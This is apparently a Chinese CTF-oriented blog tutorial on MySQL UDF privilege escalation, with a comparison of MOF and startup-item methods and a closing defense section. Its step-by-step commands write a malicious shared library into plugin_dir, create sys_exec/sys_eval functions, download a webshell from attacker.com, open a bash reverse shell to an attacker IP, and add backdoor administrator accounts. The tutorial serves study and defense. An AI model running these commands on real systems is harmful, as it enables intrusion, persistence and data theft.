---
layout: post
title: "MySQL UDF提权技术详解：从Webshell到系统权限"
date: 2026-04-28 14:00:00 +0800
categories: [Web安全, CTF]
tags: [MySQL, UDF提权, 权限提升, 渗透测试, CTF, 数据库安全]
description: 深入解析MySQL UDF提权的原理、前置条件、实战操作步骤以及常见坑点，帮助CTF新手掌握从低权限WebShell获取服务器最高权限的经典攻击路径。
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [什么是UDF提权](#什么是udf提权)
- [前置条件](#前置条件)
- [核心原理](#核心原理)
- [实战操作四步走](#实战操作四步走)
- [三种MySQL提权方法对比](#三种mysql提权方法对比)
- [避坑指南](#避坑指南)
- [防御措施](#防御措施)
- [参考资源](#参考资源)

---

## 什么是UDF提权

UDF（User Defined Function，用户自定义函数）提权是CTF Web题目中一种经典的攻击路径：**从拿到Webshell（通常是低权限的Web服务账户），到利用数据库功能获取服务器最高权限（如root或system）**。

简单来说，它的原理就是：**通过MySQL/MariaDB这类关系型数据库，加载并执行一个能调用系统命令的恶意"自定义函数"，从而拿到服务器的控制权**。

### UDF提权在渗透测试中的位置

UDF提权不是渗透的第一步，而是"横向/纵向移动"的关键环节。通常在你已经获得以下基础后，才会考虑使用UDF提权：

1. 已通过SQL注入、文件上传等漏洞获得低权限Webshell
2. 已从配置文件（如config.php）中获取到数据库高权限账号
3. 需要进一步提升权限以获取flag或控制整个系统

---

## 前置条件

在开始UDF提权之前，必须满足以下关键条件：

### 1. 已拿到Webshell

你已经通过文件上传、SQL注入等方式获得了服务器的低权限Webshell（比如作为`www-data`、`apache`、`IUSR`等用户）。

### 2. 已获取数据库高权限账号

拿到了MySQL的`root`账户密码。这在CTF中很常见，密码通常写在Web应用的配置文件里：

```php
<?php
// config.php 示例
$db_host = 'localhost';
$db_user = 'root';
$db_pass = 'password123';
$db_name = 'ctf_db';
?>
```

### 3. 数据库允许"越界"写文件

MySQL的`secure_file_priv`变量必须为空，这个安全选项为空，才意味着数据库可以把文件写到任意目录。

| 配置值 | 含义 | 是否可利用 |
|-------|------|-----------|
| `''`（空） | 不限制导入导出的目录 | ✅ 可利用 |
| `/tmp/` | 仅允许在指定目录下进行导入导出 | ⚠️ 受限 |
| `NULL` | 禁止所有导入导出操作 | ❌ 不可利用 |

**查看当前配置：**

```sql
SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';
```

---

## 核心原理

### 数据库为什么会执行系统命令？

MySQL本身不具备直接执行`whoami`这类系统命令的能力。UDF机制相当于MySQL给开发者留的"增强接口"，允许通过加载外部的：

- **Windows**: `.dll` 动态链接库
- **Linux**: `.so` 共享对象文件

来给MySQL增加新功能。

### 攻击流程

攻击者的做法可以概括为四步：

```
1. 编写/获取一个能执行系统命令的库文件
          ↓
2. 用MySQL高权限账号把这个文件"写"到服务器特定目录（plugin_dir）
          ↓
3. 用SQL语句"导入"这个函数（CREATE FUNCTION）
          ↓
4. 在SQL里调用函数，执行系统命令
```

### 关键系统变量

```sql
-- 查看MySQL版本（决定dll/so文件的存放位置要求）
SELECT VERSION();

-- 查看操作系统类型和架构（Linux还是Win，32位还是64位）
SHOW VARIABLES LIKE '%compile%';

-- 查看插件目录（恶意文件要放在这里）
SHOW VARIABLES LIKE 'plugin_dir';

-- 查看所有与plugin相关的配置
SHOW VARIABLES LIKE '%plugin%';
```

---

## 实战操作四步走

这里以最经典的MySQL环境为例，详细讲解每一步的操作：

### 第1步：信息收集（决定成败的关键）

拿到数据库权限后，先摸清环境，避免踩坑。

```sql
-- 查看MySQL版本，决定dll/so文件的存放位置
SELECT VERSION();

-- 查看操作系统类型和架构（Linux还是Win，32位还是64位）
SHOW VARIABLES LIKE '%compile%';

-- 【最关键】查看安全选项，必须为空才能继续
SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';

-- 查看插件目录，这就是稍后要放恶意文件的地方
SHOW VARIABLES LIKE 'plugin_dir';

-- 查看当前数据库用户
SELECT USER();

-- 查看当前用户权限
SHOW GRANTS;
```

### 第2步：获取动态链接库文件

你不能直接上传一个文本上去，需要一个**编译好的二进制文件**。有三种常见方法：

#### 方法1：从攻击机自带工具提取

如果你用Kali Linux，`sqlmap`和`Metasploit`都自带UDF提权文件：

```bash
# sqlmap的UDF文件路径（经过异或编码）
/usr/share/sqlmap/data/udf/mysql/

# 使用cloak工具解码
python /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_

# Metasploit的UDF文件路径
/usr/share/metasploit-framework/data/exploits/mysql/
```

#### 方法2：直接复制或下载

可以直接从Metasploit的目录里复制，或者从Exploit-DB这类漏洞库网站搜索"MySQL UDF"找到源码。

#### 方法3：自己编译

如果环境特殊，可以直接搜UDF的C源码，在本地用gcc编译一个`.so`文件再传上去：

```bash
# Linux下编译UDF库
gcc -shared -fPIC -o udf.so udf.c
```

### 第3步：上传并导入函数

这是操作的核心，关键点是**把文件放到`plugin_dir`指定的目录下**。

#### 3.1 将UDF文件写入插件目录

```sql
-- 方法1：使用INTO DUMPFILE（推荐，保持原始数据无格式）
SELECT 0x7f454c4602010100000000000000000002003e000100000000... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 方法2：先将本地udf文件转为十六进制，再写入
-- 在本地执行：xxd -p udf.so | tr -d '\n'
-- 然后复制十六进制字符串到SQL中
SELECT 0x[十六进制内容] INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

#### 3.2 创建自定义函数

文件到位后，在MySQL里执行：

```sql
-- 创建一个名叫 sys_exec 的函数，让它指向刚才上传的so文件
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';

-- 或者创建 sys_eval 函数（推荐，能返回命令输出）
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
```

**函数区别：**

| 函数名 | 返回值 | 特点 |
|-------|-------|------|
| `sys_exec()` | 整数（状态码） | 只返回命令执行是否成功，不显示输出 |
| `sys_eval()` | 字符串 | 能返回命令执行后的屏幕输出（回显），更好用 |

#### 3.3 验证函数创建成功

```sql
-- 查看已创建的函数
SELECT * FROM mysql.func;

-- 或者
SHOW FUNCTION STATUS;
```

### 第4步：执行系统命令，拿下权限

函数创建成功后，就可以在SQL语句里直接执行系统命令了：

```sql
-- 使用 sys_eval 直接查看命令回显
SELECT sys_eval('whoami');
SELECT sys_eval('id');
SELECT sys_eval('ls -la /');

-- 使用 sys_exec 执行命令（返回状态码0表示成功）
SELECT sys_exec('wget http://attacker.com/shell.php -O /var/www/html/shell.php');

-- 将命令结果输出到Web目录方便直接访问
SELECT sys_exec('whoami > /var/www/html/output.txt');
SELECT sys_exec('cat /flag > /var/www/html/flag.txt');
```

#### 拿到权限后的常规操作

```sql
-- 反弹shell到攻击机
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/ attacker_ip/4444 0>&1"');

-- 添加后门用户（Linux）
SELECT sys_exec('useradd -m -s /bin/bash hacker && echo "hacker:password" | chpasswd');

-- 添加后门用户（Windows）
SELECT sys_exec('net user hacker password /add && net localgroup administrators hacker /add');
```

---

## 三种MySQL提权方法对比

网上常说的三种MySQL提权方法，通常指的就是 **UDF提权、MOF提权和启动项提权**。这三种都是针对Windows系统的攻击手法。

### 对比总览

| 提权方法 | 核心原理 | 主要适用环境 | 成功关键 |
|---------|---------|-------------|---------|
| **UDF提权** | 利用MySQL接口，加载恶意动态库(.dll/.so)来执行系统命令 | 通用性最好，Windows和Linux都支持，从低版本到高版本都有对应方法 | `secure_file_priv`为空；且知道MySQL的plugin目录并可写入 |
| **MOF提权** | 利用Windows的WMI子系统，每5秒会执行一次`%SystemRoot%\System32\wbem\MOF\`下的.mof文件 | 已淘汰，仅适用于Windows Server 2003及更早的系统 | 高权限数据库账号；且有权限向MOF目录写入文件 |
| **启动项提权** | 把恶意脚本或程序写入Windows的开机启动目录或注册表项 | Windows系统 | 能写入启动目录或相关注册表项；且需等待服务器重启才能生效 |

### 1. UDF提权（最主流）

这和你之前了解的是同一件事，也是这三种方法里**适用性最广、最常用**的一种。

**Windows下的关键变化：**
- MySQL 5.1是个分水岭：大于5.1版本时，`.dll`文件**必须**放在MySQL安装目录下的`lib/plugin`文件夹里
- 这个文件夹默认往往不存在，有时还需要利用NTFS数据流（ADS）来创建文件夹

**函数回显问题：**
- `sys_exec()` 只返回命令是否执行成功的状态码
- `sys_eval()` 能返回命令执行后的输出结果，更推荐使用

### 2. MOF提权（已淘汰）

这个方法现在基本可以看作是"历史知识"了。

**原理：**
利用Windows系统一个叫WMI（Windows Management Instrumentation）的管理机制。系统会定期扫描`%SystemRoot%\System32\wbem\MOF\`这个目录并执行里面的`.mof`文件。

**为什么在CTF里很少见：**
因为从Windows Server 2008开始，微软就修复了这个机制，所以这种方法对任何现代的Windows系统都无效了。

### 3. 启动项提权（受限）

这种方法的关键限制在于"重启"这一步。

**原理：**
利用MySQL的写文件功能，将一个能添加管理员用户或执行命令的脚本（如`.bat`、`.vbs`）或程序，写入到Windows系统的"启动"目录里。

**CTF实战中的难点：**
脚本只在**服务器重启后**才会执行。而在CTF比赛环境里，通常不允许或无法触发重启，这就大大限制了它的可用性。

---

## 避坑指南

新手在做题时，80%的失败都卡在下面这几个点上：

### 1. `secure_file_priv` 不为空

这是CTF中最常见的"坑"，如果值被设置为`NULL`或固定目录，利用难度会大增。

**解决方案：**
- 如果是CTF题目，检查是否有其他方式可以修改这个配置
- 尝试使用慢查询日志或General日志GetShell（不需要`secure_file_priv`为空）

### 2. 高版本MySQL的特殊性

MySQL 5.1以上版本要求文件**必须**精确存放在`plugin_dir`指定的目录下。

**常见问题：**
- `lib/plugin`目录默认不存在
- 需要利用NTFS数据流（ADS）等特殊技巧来创建文件夹

**Windows下创建目录的技巧：**
```sql
-- 利用NTFS数据流创建目录
SELECT 'test' INTO OUTFILE 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin::$INDEX_ALLOCATION';
```

### 3. 系统区分

Windows和Linux下的动态链接库文件**不通用**：
- Windows用`.dll`
- Linux用`.so`

**必须提前确认：**
- 靶机操作系统类型（Windows/Linux）
- 系统架构（32位/64位）

### 4. 常见错误排查

| 错误信息 | 可能原因 | 解决方案 |
|---------|---------|---------|
| `Can't open shared library` | 文件路径错误或文件损坏 | 检查`plugin_dir`，确认文件完整上传 |
| `Function already exists` | 函数已存在 | 先删除旧函数：`DROP FUNCTION sys_exec;` |
| `Permission denied` | 文件权限不足 | 检查目录权限，确认MySQL用户有写入权限 |
| `File already exists` | 文件已存在 | INTO OUTFILE不支持覆盖，先删除或使用DUMPFILE |

---

## 防御措施

### 1. 数据库配置安全

```ini
# my.cnf 或 my.ini
[mysqld]
# 限制文件导入导出目录，不要设置为空
secure_file_priv = /tmp

# 或者禁止所有导入导出（最严格）
# secure_file_priv = NULL

# 禁用危险函数
local_infile = 0
```

### 2. 最小权限原则

```sql
-- 创建应用专用账号，只授予必要权限
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'app_user'@'localhost';

-- 明确禁止危险权限
REVOKE FILE ON *.* FROM 'app_user'@'localhost';
REVOKE SUPER ON *.* FROM 'app_user'@'localhost';
```

### 3. 文件系统权限

- Web目录禁止数据库用户写入
- 使用chroot jail限制MySQL进程
- 定期扫描Web目录中的可疑文件

### 4. 监控和审计

```sql
-- 监控异常函数创建
-- 定期检查mysql.func表
SELECT * FROM mysql.func;

-- 监控插件目录的文件变化
```

---

## 参考资源

### 相关博客

- [SQL注入GetShell技术详解]({{ site.baseurl }}{% post_url 2026-04-10-sql-injection-getshell-guide %}) - 与UDF提权形成知识互补
- [文件上传漏洞详解]({{ site.baseurl }}{% post_url 2026-03-07-file-upload-vulnerability %}) - 获取Webshell的常用方法

### 在线资源

- [CTF Wiki - MySQL注入](https://ctf-wiki.org/web/sqli/)
- [狼组安全团队 - SQL注入知识库](https://wiki.wgpsec.org/knowledge/ctf/sql.html)
- [MySQL官方文档 - 安全](https://dev.mysql.com/doc/refman/8.0/en/security.html)
- [Exploit-DB MySQL UDF](https://www.exploit-db.com/search?q=mysql+udf)

### 工具推荐

- **SQLMap**: 自动化SQL注入工具，内置UDF提权功能
- **Metasploit**: 渗透测试框架，包含MySQL UDF提权模块
- **D盾**: Webshell检测工具

### 推荐书籍

- 《Web安全深度剖析》
- 《渗透测试实战》
- 《白帽子讲Web安全》

---

## 总结

UDF提权是CTF Web题目中一种经典且实用的提权技术，掌握它需要理解：

1. **前置条件**: Webshell + 数据库root权限 + `secure_file_priv`为空
2. **核心原理**: 通过加载恶意动态库给MySQL增加系统命令执行功能
3. **操作流程**: 信息收集 → 获取UDF文件 → 上传导入 → 执行命令
4. **方法对比**: UDF提权最通用，MOF和启动项提权受限较多

### 学习建议

1. 先在本地搭建环境练习，熟悉每一步操作
2. 多关注CTF比赛中的相关题目，实战积累经验
3. 了解防御措施，从攻防双向理解漏洞

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年4月28日*
